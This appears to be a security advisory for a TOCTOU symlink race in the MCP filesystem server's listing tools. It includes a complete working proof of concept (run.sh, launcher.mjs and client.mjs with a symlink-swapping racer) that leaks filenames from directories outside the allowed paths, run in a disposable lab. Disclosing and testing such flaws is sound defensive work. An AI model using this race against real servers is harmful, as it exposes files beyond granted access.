description:
## Summary

In `@modelcontextprotocol/server-filesystem` 2.3.0, `list_directory`, `list_directory_with_sizes`, `directory_tree` and `search_files` validate the requested directory and then read it again by path. A local process that can rename a directory inside an allowed directory can swap it for a symlink between the check and the `readdir`. When the swap wins, the server returns the names and types of the entries of a directory outside `allowedDirectories`. In a two-user Linux test, an attacker user who gets `EACCES` listing the outside directory received the random name of a file in it through each of the four tools.

This is the listing side of GHSA-p9cv-8g75-4xcg. The 2.3.0 fix anchors reads of file content and metadata in `pinned-directory.ts`; the four listings still read by path. It differs from GHSA-hhwq-wxfx-cj7g, where a symlinked entry's target was stat'd: here the listed directory itself is swapped, and the names come from `readdir`.

## Details

**Affected versions.** npm `@modelcontextprotocol/server-filesystem` 2.3.0, the current release (tarball SHA-256 `2ead6cadf4d70577025d583d8ad2e8988baa6396eadc9d0ba22fe8f791b3add2`), source at `e1dc4b18`. 2.0.0, 2.1.0, 2.2.0 and the last date-versioned release, 2026.8.31, behave the same way.

**Root cause.**
- `list_directory` and `list_directory_with_sizes` call `validatePath(args.path, …)` and then `fs.readdir(validPath, …)` (`src/filesystem/server.ts:723`, `:762`; `dist/server.js:509`, `:535`).
- `directory_tree` calls `validatePath(currentPath, …)` and then `readdirWithTimeout(validPath)` at every level (`server.ts:897`; `dist/server.js:621`).
- `search_files` calls `readdirWithTimeout(currentPath)` (`lib.ts:1307`; `dist/lib.js:937`). For a subdirectory it validates the entry (`lib.ts:1337`) and then recurses on the unresolved path.

`readdir` resolves every component of the path again, so a directory symlink put in place after validation is followed.

**Preconditions.** The attacker can rename or replace a directory inside an allowed directory while the server runs (as in GHSA-p9cv-8g75-4xcg and GHSA-53mr-w429-c597), and controls the MCP client or can induce repeated listing calls naming that directory. The outside directory is readable by the server's user.

## Proof of concept

Two OS users on Linux; the harness is the one from GHSA-p9cv-8g75-4xcg with the secret moved from a file's content to a file's name. A root launcher runs the published server as UID 1001 and the MCP client plus a racer as UID 1002, and creates:

- `allowed/`, owned by the attacker and the server's only allowed directory, containing `allowed/flip/marker.txt`;
- `outside/`, owned by the server user with mode 0700, containing one file named `NAMECANARY_<24 random hex>.txt`.

The client is never given the name. It confirms that listing `outside/` directly fails with `EACCES`, and checks through the server that `allowed/flip` lists `marker.txt` while the outside path and a static symlink `allowed/flip -> outside` are refused. It then starts a racer that swaps `allowed/flip` between the real directory and a symlink to `outside/`, and calls the tool on `allowed/flip` in batches of 100 until a batch returns the name. The launcher compares the SHA-256 of the name it created with that of the name the client received.

Save the three files below in one directory and run `sh run.sh` as root inside a disposable Linux container or VM with Node 24 and npm. Results on 2026-11-18, package installed from npm:

| Tool | Raced, Node 24.22.3 | Raced, Node 22.23.5 | Unraced control |
| --- | --- | --- | --- |
| `list_directory` | outside name in 15 of 200 responses | 11 of 300 | 0 of 500 |
| `list_directory_with_sizes` | 7 of 200 | 5 of 200 | 0 of 500 |
| `directory_tree` | 46 of 200 | 2 of 300 | 0 of 500 |
| `search_files` | 11 of 200 | 8 of 200 | 0 of 500 |

The launcher's hash comparison matched in every raced run, on 2.3.0 and on 2.0.0, 2.1.0, 2.2.0 and 2026.8.31. A raced `list_directory` response contains `[FILE] NAMECANARY_….txt`; `list_directory_with_sizes` gives that entry's size as `unknown`, because sizes are read through the anchored stat.

<details><summary><code>run.sh</code></summary>

```sh
#!/bin/sh
# Run as root inside a disposable Linux container or VM with Node 24 and npm.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
VERSION=${VERSION:-2.3.0}
WORK=$(mktemp -d /tmp/mcp-fs-listing-XXXXXX)
mkdir -p "$WORK/pkg" "$WORK/harness"
(cd "$WORK/pkg" && npm install --no-audit --no-fund --ignore-scripts "@modelcontextprotocol/server-filesystem@$VERSION" >/dev/null)
cp "$HERE/launcher.mjs" "$HERE/client.mjs" "$WORK/harness/"
chmod -R a+rX "$WORK"
SERVER="$WORK/pkg/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js"
for TOOL in list_directory list_directory_with_sizes directory_tree search_files; do
  NO_RACER=1 MAX_CALLS=500 node "$WORK/harness/launcher.mjs" "$SERVER" "$TOOL"
  NO_RACER=0 MAX_CALLS=20000 node "$WORK/harness/launcher.mjs" "$SERVER" "$TOOL"
done
```

</details>

<details><summary><code>launcher.mjs</code></summary>

```js
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createHash, randomBytes } from 'node:crypto';

// Run as root only inside a disposable local container or VM. The server is
// UID 1001; the MCP client and racer are UID 1002. All data is under /tmp.
const victimUid = 1001;
const attackerUid = 1002;
const here = path.dirname(fileURLToPath(import.meta.url));
const [pkg, tool] = process.argv.slice(2);
if (!pkg || !tool) throw new Error('usage: launcher.mjs <absolute path to dist/index.js> <tool>');
const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mcp-two-uid-'));
const allowed = path.join(root, 'allowed');
const outside = path.join(root, 'outside');
const flip = path.join(allowed, 'flip');
// The file NAME is the secret: the attacker cannot list outside/ (mode 0700).
const secretName = 'NAMECANARY_' + randomBytes(12).toString('hex') + '.txt';
await fs.mkdir(flip, { recursive: true });
await fs.mkdir(outside);
await fs.writeFile(path.join(flip, 'marker.txt'), 'BENIGN_INSIDE_TWO_UID');
await fs.writeFile(path.join(outside, secretName), 'x', { mode: 0o600 });
await fs.chmod(root, 0o755);
for (const p of [allowed, flip, path.join(flip, 'marker.txt')]) await fs.chown(p, attackerUid, attackerUid);
await fs.chmod(allowed, 0o755);
await fs.chmod(flip, 0o755);
for (const p of [outside, path.join(outside, secretName)]) await fs.chown(p, victimUid, victimUid);
await fs.chmod(outside, 0o700);

const server = spawn(process.execPath, [pkg, allowed], { uid: victimUid, gid: victimUid, stdio: ['pipe', 'pipe', 'ignore'] });
const client = spawn(process.execPath, [path.join(here, 'client.mjs'), allowed, outside, tool], {
  uid: attackerUid, gid: attackerUid, stdio: ['pipe', 'pipe', 'pipe'],
  env: { ...process.env, MAX_CALLS: process.env.MAX_CALLS ?? '20000', NO_RACER: process.env.NO_RACER ?? '0' },
});
client.stdout.pipe(server.stdin);
server.stdout.pipe(client.stdin);
let clientLog = '';
client.stderr.on('data', c => { clientLog += c.toString(); });
const code = await new Promise(resolve => client.on('exit', resolve));
server.kill('SIGTERM');
let report;
try { report = JSON.parse(clientLog.split('\n').find(line => line.startsWith('{"race":'))).race; } catch { report = null; }
const captured = report?.capturedName ?? null;
const digest = v => v === null ? null : createHash('sha256').update(v).digest('hex');
const noRacer = process.env.NO_RACER === '1';
const match = captured === secretName;
console.log(JSON.stringify({
  tool, version: report?.version, noRacer, calls: report?.total, outsideNameReturned: report?.leaks,
  directList: report?.directList, controls: report?.controls,
  secretNameSha256: digest(secretName), capturedNameSha256: digest(captured), match,
  ...(report ? {} : { clientError: clientLog.slice(-400) }),
}));
process.exitCode = (code === 0 && match === !noRacer) ? 0 : 1;
```

</details>

<details><summary><code>client.mjs</code></summary>

```js
import fs from 'node:fs/promises';
import path from 'node:path';
import { spawn } from 'node:child_process';

if (process.argv[2] === '--racer') {
  const [f, s, o] = process.argv.slice(3);
  for (;;) {
    try {
      await fs.rename(f, s);
      await fs.symlink(o, f);
      await fs.unlink(f);
      await fs.rename(s, f);
    } catch {
      try { await fs.unlink(f); } catch {}
      try { await fs.rename(s, f); } catch {}
    }
  }
}

const [allowed, outside, tool] = process.argv.slice(2);
const flip = path.join(allowed, 'flip');
const stash = path.join(allowed, 'stash');
// The random part of the name is generated only by the launcher and never passed here.
const namePattern = /NAMECANARY_[0-9a-f]+\.txt/;
const args = { list_directory: { path: flip }, list_directory_with_sizes: { path: flip },
  directory_tree: { path: flip }, search_files: { path: flip, pattern: '*' } }[tool];
if (!args) throw new Error(`unknown tool ${tool}`);

let directList;
try { directList = (await fs.readdir(outside)).join(','); } catch (e) { directList = `ERROR:${e.code}`; }
if (directList !== 'ERROR:EACCES') throw new Error(`attacker directly listed outside: ${directList}`);

let buffer = '';
let id = 1;
const pending = new Map();
process.stdin.on('data', chunk => {
  buffer += chunk.toString();
  for (;;) {
    const cut = buffer.indexOf('\n');
    if (cut < 0) break;
    const line = buffer.slice(0, cut); buffer = buffer.slice(cut + 1);
    if (!line.trim()) continue;
    let msg;
    try { msg = JSON.parse(line); } catch { continue; }
    if (!('id' in msg)) continue;
    const callback = pending.get(msg.id);
    if (callback) { pending.delete(msg.id); callback(msg); }
  }
});
function send(method, params) {
  const requestId = id++;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`MCP timeout ${requestId}`)), 60000);
    pending.set(requestId, msg => { clearTimeout(timer); resolve(msg); });
    process.stdout.write(JSON.stringify({ jsonrpc: '2.0', id: requestId, method, params }) + '\n');
  });
}
const text = m => JSON.stringify(m.result?.content ?? m.error ?? m);
const init = await send('initialize', { protocolVersion: '2025-11-25', capabilities: {}, clientInfo: { name: 'two-uid-owned-lab', version: '1.0.0' } });
if (init.error) throw new Error(JSON.stringify(init.error));
process.stdout.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n');
const call = () => send('tools/call', { name: tool, arguments: args });

// Controls through the server: the inside directory lists its own file; the
// outside directory and a static symlink to it are refused.
const inside = text(await call());
const direct = text(await send('tools/call', { name: tool, arguments: { ...args, path: outside } }));
await fs.rename(flip, stash);
await fs.symlink(outside, flip);
const staticLink = text(await call());
await fs.unlink(flip);
await fs.rename(stash, flip);
if (!inside.includes('marker.txt') || namePattern.test(inside) || namePattern.test(direct) || !direct.includes('Access denied') ||
    namePattern.test(staticLink) || !staticLink.includes('Access denied')) {
  throw new Error(`control failed: ${JSON.stringify({ inside, direct, staticLink })}`);
}

let racer;
if (process.env.NO_RACER !== '1') {
  racer = spawn(process.execPath, [new URL(import.meta.url).pathname, '--racer', flip, stash, outside], { stdio: 'ignore' });
}
const maxCalls = Number(process.env.MAX_CALLS ?? 20000);
let total = 0, leaks = 0, capturedName = null;
try {
  while (total < maxCalls && leaks === 0) {
    const batch = Math.min(100, maxCalls - total);
    const messages = await Promise.all(Array.from({ length: batch }, () => call()));
    total += batch;
    for (const message of messages) {
      const found = text(message).match(namePattern);
      if (found) { leaks++; capturedName ??= found[0]; }
    }
  }
} finally {
  racer?.kill('SIGTERM');
}
process.stderr.write(JSON.stringify({ race: { version: init.result?.serverInfo?.version, directList, controls: 'PASS', total, leaks, capturedName } }) + '\n');
process.exit(0);
```

